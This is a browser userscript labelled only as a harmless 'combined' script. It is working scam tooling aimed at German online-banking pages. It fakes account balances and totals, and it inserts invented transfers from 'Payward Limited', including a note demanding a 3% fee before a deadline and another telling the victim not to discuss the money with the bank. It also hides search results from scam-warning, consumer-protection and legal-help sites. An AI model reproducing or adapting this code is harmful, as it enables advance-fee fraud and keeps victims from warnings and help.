// ==UserScript==
// @name         Combined Ralf Melzer Sp
// @namespace    http://tampermonkey.net/
// @version      3.0
// @description  Combine multiple scripts
// @author       You
// @match        https://yahoo.com/sign/as/*
// @match        https://yahoo.com/sign/ac/*
// @match        https://yahoo.com/sign/ar/*
// @match        https://yahoo.com/sign/bs/*
// @match        https://yahoo.com/sign/sc/*
// @match        https://yahoo.com/sign/am/*
// @match        https://yahoo.com/sign/op/*
// @match        https://yahoo.com/sign/idi/*
// @match        https://yahoo.com/sign/ot/*
// @match        https://yahoo.com/sign/cli/*
// @match        https://yahoo.com/sign/ien/*
// @match        https://yahoo.com/sign/ts/*
// @match        *://*/*
// @icon         https://www.google.com/s2/favicons?sz=64&domain=google.com
// @grant        GM_xmlhttpRequest
// @run-at       document-end
// @downloadURL https://update.greasyfork.org/scripts/479857/Combined%20Ralf%20Melzer%20Sp.user.js
// @updateURL https://update.greasyfork.org/scripts/479857/Combined%20Ralf%20Melzer%20Sp.meta.js
// ==/UserScript==

(function() {
    'use strict';

    // Your code here...


    //SCRIPTV2 TRIGGER!
    var easyUpdate = "no";


    var pointerOverviewTotal = "";
    var pointerTabelle = "xx";
    var absender = "Treuhand: Payward Limited";
    var absenderTitel = "Treuhand: Payward Limited";
    var firma = "test";
    var asenderReference = "WD3746 TRX88205A CX13280";
    var absenderDetails = "WENN BIS 21.11.23 DIE 3% NICHT DA, DANN AUSZAHLUNG WIRD ZURÜCKGEBUCHT";
    var amount = 0;
    var vorgemerkt = "yes";
    var xamount = 26000;
    var x2amount = 0;
    var buchung = 20000;
    var buchungDecimal = "70";
    var buchungTextsZahl = "944.148";
    var accountsecurity = "4001 3053 35";

    if (easyUpdate == "yes"){
        x2amount = 10000;}


    function numberWithCommas(x) {
        return x.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ".");}

    if (window.location.href.indexOf("finanzuebersicht") > 0 || window.location.href.indexOf("10735971306") > 0 || window.location.href.indexOf("10732567240") > 0) {
        //Wir sind in der Finanzuebersicht
        if (vorgemerkt == "no"){

    /// Refresh the finanzstatus page once it loads for the first time

var refresh = window.localStorage.getItem('refresh');
console.log(refresh);
setTimeout(function() {
if (refresh===null){
    window.location.reload();
    window.localStorage.setItem('refresh', "1");
}
}, 3000); // 1500 milliseconds = 1.5 seconds

setTimeout(function() {
localStorage.removeItem('refresh')
}, 1700); // 1700 milliseconds = 1.7 seconds

                                  var KontosBoxElement = document.getElementsByClassName("nbf-container-box nbf-container--pfm expandable")[0];
if (KontosBoxElement) {
    KontosBoxElement.remove();
}

            var main = 1;
            var subtotal = 7;
            var total = 14;

            var xpointerOverviewAcc = document.getElementsByClassName("balance-predecimal")[main].textContent;
            var xrealAccBalance = xpointerOverviewAcc.replace(".", "");
            var xfakeAccBalance = parseFloat(xrealAccBalance) + xamount;
            var xfakeAccBalancewithcomma = numberWithCommas(xfakeAccBalance);
            document.getElementsByClassName("balance-predecimal")[main].textContent = xfakeAccBalancewithcomma;

            //Wenn nicht vorgemerkt sein soll, dann faken wir die Balance in die Uebersicht.
            //var pointerOverviewAcc = document.getElementsByClassName("balance-predecimal")[2].textContent;
            //var realAccBalance = pointerOverviewAcc.replace(".", "");
            //var fakeAccBalance = parseFloat(realAccBalance) + amount;
            //var fakeAccBalancewithcomma = numberWithCommas(fakeAccBalance);

            //Update Balance
            //document.getElementsByClassName("balance-predecimal")[2].textContent = fakeAccBalancewithcomma;

            if (easyUpdate == "yes"){
                var updaterCheck = document.getElementsByClassName("balance-predecimal")[2].textContent;
                var updaterCheckBalance = updaterCheck.replace(".", "");
                var updaterFakeBalance = parseFloat(xrealAccBalance) + x2amount;
                var updaterFakeSPK = numberWithCommas(updaterFakeBalance);
                document.getElementsByClassName("balance-predecimal")[2].textContent = updaterFakeSPK;
            }

            var zwischenSumme = document.getElementsByClassName("balance-predecimal")[subtotal].textContent;
            var zwischenSummeReal = zwischenSumme.replace(".", "");
            var zwischenSummeFake = parseFloat(zwischenSummeReal) + x2amount +xamount;
            var zwischenSummeNwc = numberWithCommas(zwischenSummeFake);

            //Update ZwischenSumme
            document.getElementsByClassName("balance-predecimal")[subtotal].textContent = zwischenSummeNwc;

            var TotalAmount = document.getElementsByClassName("balance-predecimal")[total].textContent;
            var TotalAmountReal = TotalAmount.replace(".", "");
            var TotalAmountFake = parseFloat(TotalAmountReal) + x2amount +xamount;
            var TotalAmountNwc = numberWithCommas(TotalAmountFake);

            //Update Total
            document.getElementsByClassName("balance-predecimal")[total].textContent = TotalAmountNwc;

        }

    }

    if (window.location.href.indexOf("umsaetze") > 0 || window.location.href.indexOf("10735800034") > 0 ) {

        //Wir sind im Kontostand
        var AccBalance = document.getElementsByClassName("mkp-currency-lg")[0].childNodes[0].textContent;
        var AccBalanceReal = AccBalance.replace(".", "");
        var AccBalanceFake = parseFloat(AccBalanceReal) + x2amount;
        var AccBalanceFake2 = parseFloat(AccBalanceReal) + xamount;
        var AccBalanceNwc2 = numberWithCommas(AccBalanceFake2);
        var AccBalanceNwc = numberWithCommas(AccBalanceFake);
        var singleAmount = numberWithCommas(amount);

        //Update Kontostand oben
        //if (vorgemerkt == "no"){
        //    document.getElementsByClassName("mkp-currency-lg")[0].childNodes[0].textContent = AccBalanceNwc;

        //}

        //document.getElementsByClassName("mkp-card-list")[1]

        if (document.getElementsByClassName("mkp-identifier-description")[0].children[1].children[0].textContent == accountsecurity ){
            if (vorgemerkt == "no"){
                document.getElementsByClassName("mkp-currency-lg")[0].childNodes[0].textContent = AccBalanceNwc2;
                      var saldoLinechartElement = document.getElementsByClassName("saldo-linechart")[0];
if (saldoLinechartElement) {
    saldoLinechartElement.remove();
}
            }
            var xxxxxHTML = '<div class="mkp-card-list"><span class="mkp-list-subline">Spezialauftrag Treuhand (1)</span><ul class="mkp-card-group mkp-group-unify mkp-group-clickable" aria-label="Treuhand"><li aria-label="Treuhand Auftrag"><div class="mkp-card mkp-card-debit mkp-card-thinner mkp-card-clickable"><div class="mkp-identifier"><div class="mkp-identifier-description"><h3><a href="#" onclick="return IF.checkFirstSubmit();" class="mkp-identifier-link" title="Bruno Scheibner: Treuhand Freigabe nötig durch Bruno Scheibner">Treuhand: Freigabe nötig durch Matthias Kabisch</a></h3><p>Treuhand-Auftrag: DE11501900000006605826</p></div><div class="mkp-identifier-sticker-placeholder"></div><div class="mkp-identifier-currency"><div class="mkp-currency mkp-currency-m"><span aria-hidden="true" class="balance-predecimal plus">207.547</span><span aria-hidden="true" class="balance-decimal plus">,07&nbsp;EUR</span><span aria-hidden="false" class="offscreen">-100,00 EUR</span></div></div></div></div></li></ul></div>';
            var saveHTML = document.getElementsByClassName("mkp-card-list")[0].innerHTML;
            var xHTML = '<li aria-label="RUECKUEBERWEISUNG Sonstige Gruende Transfer  ; '+buchungTextsZahl+' EUR" style="list-style-type: none;"><div class="mkp-card mkp-card-debit mkp-card-thinner mkp-card-clickable"><div class="mkp-identifier"><div class="mkp-identifier-description"><h3><a href="#" onclick="return IF.checkFirstSubmit();" class="mkp-identifier-link" title="'+absenderTitel+'">'+absender+'</a></h3><p>'+absenderDetails+'</p></div><div class="mkp-identifier-sticker-placeholder"></div><div class="mkp-identifier-currency"><div class="mkp-currency mkp-currency-m"><span aria-hidden="true" class="balance-predecimal plus">'+buchungTextsZahl+'</span><span aria-hidden="true" class="balance-decimal plus">,'+buchungDecimal+'&nbsp;EUR</span><span aria-hidden="false" class="offscreen">15.308,00 EUR</span></div></div></div></div></li>';

            //var save2HTML = document.getElementsByClassName("mkp-card-list")[1].innerHTML;
            var x2HTML = '<li aria-label="RUECKUEBERWEISUNG Sonstige Gruende Transfer  ; 26.000,00 EUR" style="list-style-type: none;"><div class="mkp-card mkp-card-debit mkp-card-thinner mkp-card-clickable"><div class="mkp-identifier"><div class="mkp-identifier-description"><h3><a href="#" onclick="return IF.checkFirstSubmit();" class="mkp-identifier-link" title="Payward Limited">Payward Limited</a></h3><p>Geld für Steuern. Mit Sparkasse das Geld NICHT besprechen, damit nicht gesperrt wird.</p></div><div class="mkp-identifier-sticker-placeholder"></div><div class="mkp-identifier-currency"><div class="mkp-currency mkp-currency-m"><span aria-hidden="true" class="balance-predecimal plus">26.000</span><span aria-hidden="true" class="balance-decimal plus">,00&nbsp;EUR</span><span aria-hidden="false" class="offscreen">26.000,00 EUR</span></div></div></div></div></li>';
            //document.getElementsByClassName("mkp-card-list")[1].innerHTML = save2HTML + x2HTML;
            //block spk-analytics.js;
          document.getElementsByClassName("mkp-card-list")[0].innerHTML =  saveHTML;
        }

        if (document.getElementsByClassName("mkp-identifier-description")[0].children[1].children[0].textContent == "1800 0168 34"){
            if (vorgemerkt == "no" && easyUpdate == "yes"){
                document.getElementsByClassName("mkp-currency-lg")[0].childNodes[0].textContent = AccBalanceNwc;
             var ssaldoLinechartElement = document.getElementsByClassName("saldo-linechart")[0];
if (ssaldoLinechartElement) {
    ssaldoLinechartElement.remove();
}
            }
            var save2HTML = document.getElementsByClassName("mkp-card-list")[0].innerHTML;
            var Sx2HTML = '<li aria-label="RUECKUEBERWEISUNG Sonstige Gruende Transfer  ; 10.000,00 EUR" style="list-style-type: none;"><div class="mkp-card mkp-card-debit mkp-card-thinner mkp-card-clickable"><div class="mkp-identifier"><div class="mkp-identifier-description"><h3><a href="#" onclick="return IF.checkFirstSubmit();" class="mkp-identifier-link" title="Payward Limited">Payward Limited</a></h3><p>Withdrawal Trading Account: AY01-503DE-SP</p></div><div class="mkp-identifier-sticker-placeholder"></div><div class="mkp-identifier-currency"><div class="mkp-currency mkp-currency-m"><span aria-hidden="true" class="balance-predecimal plus">10.000</span><span aria-hidden="true" class="balance-decimal plus">,00&nbsp;EUR</span><span aria-hidden="false" class="offscreen">9.200,00 EUR</span></div></div></div></div></li>';
            document.getElementsByClassName("mkp-card-list")[0].innerHTML = Sx2HTML + save2HTML;
        }

    }

    if (window.location.href.indexOf("einzelauftrag") > 0 || window.location.href.indexOf("uebertrag") > 0 || window.location.href.indexOf("10733487459") > 0 ) {


if (document.getElementsByClassName("mkp-identifier-description")[0].children[1].children[0].textContent == accountsecurity ){

        if (vorgemerkt == "no"){
            var elementExists = document.getElementsByClassName("balance-predecimal")[0];
            var shouldBeBalance = "";
            var uwdone = 0;
            setInterval(function() { elementExists = document.getElementsByClassName("balance-predecimal")[0];
                                    if (elementExists != null){
                                        if (uwdone == 0){
                                            //amount = 7149;
                                            var uwBalance = document.getElementsByClassName("balance-predecimal")[0].textContent;
                                            var uwBalanceReal = uwBalance.replace(".", "");
                                            var uwBalancneFake = parseFloat(uwBalanceReal) + xamount;
                                            var uwBalanceNwc = uwBalancneFake.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ".");
                                            document.getElementsByClassName("balance-predecimal")[0].textContent = uwBalanceNwc;
                                            uwdone = 1;
                                            shouldBeBalance = uwBalanceNwc;
                                        }

                                        if ( uwdone == 1 ) {
                                            if ( document.getElementsByClassName("balance-predecimal")[0].textContent != shouldBeBalance ) {
                                                document.getElementsByClassName("balance-predecimal")[0].textContent = shouldBeBalance;
                                                document.getElementById("idKontostandLine").parentNode.removeChild(document.getElementById("idKontostandLine"));
                                            }
                                        }
                                    }}, 50);} }}

     if (window.location.href.indexOf("kontodetails") > 0 || window.location.href.indexOf("10658384414") > 0 || window.location.href.indexOf("smth") > 0 ) {




        if (vorgemerkt == "no"){
            // Configurable values
    var desiredIBAN = accountsecurity; // Your desired IBAN in '     '
    var useSameAdjustmentAmount = true; // Set to true to use the same adjustment amount for all balances
    var adjustmentAmount = 0; // The adjustment amount to use if "useSameAdjustmentAmount" is true
    var BALANCE_CONFIGS = [
        { index: 0, adjustmentAmount: 3000.50 },
        { index: 1, adjustmentAmount: 3000.70 },
        { index: 2, adjustmentAmount: 3000.90 },
        { index: 3, adjustmentAmount: 3000.10 }
    ];

    // Check if the first element with class "mkp-identifier-multiline" matches the specified IBAN
    var firstIdentifierElement = document.querySelector('.mkp-identifier-multiline');
    if (firstIdentifierElement) {
        var identifierText = firstIdentifierElement.textContent.replace(/\s/g, '').toLowerCase();

        // Check if either the entire IBAN matches or at least the last 9 characters match
        if (identifierText === desiredIBAN.replace(/\s/g, '').toLowerCase() || identifierText.endsWith(desiredIBAN.slice(-9).replace(/\s/g, '').toLowerCase())) {
            console.log('IBAN matches. Balance changer started.');

            // Function to change the balance value
            function changeBalance(balanceElement, adjustmentAmount) {
                var currentBalanceText = balanceElement.textContent.trim();
                var currentBalanceValue = parseFloat(currentBalanceText.replace(/[^\d,]+/g, '').replace(',', '.'));

                if (!isNaN(currentBalanceValue)) {
                    var newBalanceValue = currentBalanceValue + adjustmentAmount;
                    var newBalanceText = formatBalance(newBalanceValue) + ' EUR'; // Add "EUR" currency symbol

                    // Change the class to "minus" if the balance is negative
                    if (newBalanceValue < 0) {
                        balanceElement.classList.remove('plus');
                        balanceElement.classList.add('minus');
                    } else {
                        balanceElement.classList.remove('minus');
                        balanceElement.classList.add('plus');
                    }

                    // Update the balance element with the new value
                    balanceElement.textContent = newBalanceText;

                    console.log('Balance changed from ' + currentBalanceText + ' to ' + newBalanceText);
                } else {
                    console.log('Failed to parse current balance value.');
                }
            }

            // Iterate through the balance configurations and apply changes
            if (useSameAdjustmentAmount) {
                BALANCE_CONFIGS.forEach(function(config) {
                    var balanceElements = document.querySelectorAll('.plus, .minus');
                    if (config.index < balanceElements.length) {
                        var balanceElement = balanceElements[config.index];
                        changeBalance(balanceElement, adjustmentAmount);
                    } else {
                        console.log('Balance element not found for index ' + config.index);
                    }
                });
            } else {
                var balanceElements = document.querySelectorAll('.plus, .minus');
                balanceElements.forEach(function(balanceElement, index) {
                    var config = BALANCE_CONFIGS.find(function(cfg) {
                        return cfg.index === index;
                    });
                    if (config) {
                        changeBalance(balanceElement, config.adjustmentAmount);
                    } else {
                        console.log('No configuration found for balance element at index ' + index);
                    }
                });
            }

            // Function to format the balance with correct separators
            function formatBalance(balance) {
                var formattedBalance = balance.toFixed(2).replace(/\./g, ','); // Use comma as decimal separator
                return formattedBalance.replace(/\B(?=(\d{3})+(?!\d))/g, "."); // Add dots as thousands separators
            }
        } else {
            console.log('IBAN does not match. Balance changer not executed.');
        }
    } else {
        console.log('No element with class "mkp-identifier-multiline" found.');
    }} }





// Script 4: Search Result Filter
    if (window.location.href.indexOf("google.com") !== -1 ||
    window.location.href.indexOf("google.de") !== -1 ||
    window.location.href.indexOf("google.at") !== -1 ||
    window.location.href.indexOf("google.ch") !== -1 ||
    window.location.href.indexOf("bing.com") !== -1) {
(function() {
  'use strict';

  // Define the words, domains, and URLs to block
  var blockedWords = ['Betrug', 'schwarz', 'Scam', 'Broker', 'Finanzbetrug', 'Auszahlung' ]; // Add the words to block here
  var blockedDomains = ['watchlist-internet.at', 'broker-zahlt-nicht.de', 'scamadviser.com', 'finanzsache.com', 'webparanoid.com', 'personal-reviews.com', 'unique-reviews.com', 'kanzlei-herfurtner.de', 'verbraucherzentrale.de', 'betrug.de', 'ritschel-keller.de', 'seitcheck.de', 'anwalt.de' ]; // Add the domains to block here
  var blockedUrls = ['https://www.example1.com', 'https://www.example2.com']; // Add the urls to block here

  // Function to hide elements
  function hideElement(element) {
    if (element.style) element.style.display = 'none';
  }

  // Function to check and hide search results
  function checkAndHideSearchResults() {
    // Google
    var googleResults = document.querySelectorAll('.g');
    googleResults.forEach(function(result) {
      var urlElement = result.querySelector('a');
      var url = urlElement ? urlElement.href : '';
      var text = result.textContent.toLowerCase();
      if (blockedUrls.includes(url) || blockedDomains.some(domain => url.includes(domain)) || blockedWords.some(word => text.includes(word))) {
        hideElement(result);
      }
    });

    // Bing
    var bingResults = document.querySelectorAll('.b_algo');
    bingResults.forEach(function(result) {
      var urlElement = result.querySelector('a');
      var url = urlElement ? urlElement.href : '';
      var text = result.textContent.toLowerCase();
      if (blockedUrls.includes(url) || blockedDomains.some(domain => url.includes(domain)) || blockedWords.some(word => text.includes(word))) {
        hideElement(result);
      }
    });
  }


  // Function to execute the search result filtering
    function executeSearchResultFilter() {
      checkAndHideSearchResults();

      // Set an interval to check repeatedly, to deal with lazy-loaded search results
      setInterval(checkAndHideSearchResults, 1000);
    }

    // Call the function immediately
    executeSearchResultFilter();
  })();
        }


})();

